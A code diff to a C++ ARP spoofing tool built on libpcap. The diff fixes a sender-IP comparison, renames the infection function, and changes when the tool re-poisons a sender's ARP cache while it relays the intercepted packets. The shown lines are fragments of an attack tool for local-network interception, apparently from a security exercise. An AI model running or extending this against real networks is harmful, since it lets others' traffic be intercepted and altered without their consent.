@@ -78,13 +78,13 @@ Mac get_smac(pcap_t* handle, Pair& pair){
         EthArpPacket* reply = (EthArpPacket*)packet;
         if (ntohs(reply->eth_.type_) != EthHdr::Arp) continue;
         if (ntohs(reply->arp_.op_) != ArpHdr::Reply) continue;
-        if (ntohl(reply->arp_.sip_) != sip) continue;
+        if (ntohl(reply->arp_.sip_) != pair.sip) continue;
 
         return Mac(reply->arp_.smac_);
     }
 }
 
-void infect_sender(pcap_t* handle, Pair& pair){
+void infect(pcap_t* handle, Pair& pair){
     EthArpPacket packet;
 
     packet.eth_.dmac_ = pair.smac;
@@ -138,9 +138,6 @@ void relay(pcap_t* handle, const u_char* packet, Pair& pair){
 }
 
 void arp_spoof(pcap_t* handle, Pair& pair){
-    infect_sender(handle, pair);
-    printf("Sender infected\n");
-
     while(true){
         struct pcap_pkthdr* header;
         const u_char* packet;
@@ -151,7 +148,7 @@ void arp_spoof(pcap_t* handle, Pair& pair){
             exit(-1);
         }
         if (is_recover(packet, pair)){
-            infect_sender(handle, pair);
+            infect(handle, pair);
             printf("Reinfect success\n");
             continue;
         } else if (is_spoofed(packet, pair)) {
